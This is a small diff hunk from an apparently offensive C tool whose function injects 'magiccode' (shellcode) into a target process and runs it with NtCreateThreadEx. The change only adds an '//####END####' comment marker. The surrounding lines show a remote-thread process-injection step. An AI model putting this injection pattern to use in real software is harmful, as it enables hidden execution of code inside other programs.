@@ -56,6 +56,10 @@ void Injectmagiccode(const HANDLE hProcess, const unsigned char* magiccode, SIZE
         printf("[-] Failed to change memory protection back\n");
     }
     
+
+    //####END####
+
+    
     // Creating a thread in the target process to execute the magiccode
     status = NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, hProcess, lpAllocationStart, NULL, FALSE, 0, 0, 0, NULL);
     if (status == 0) {
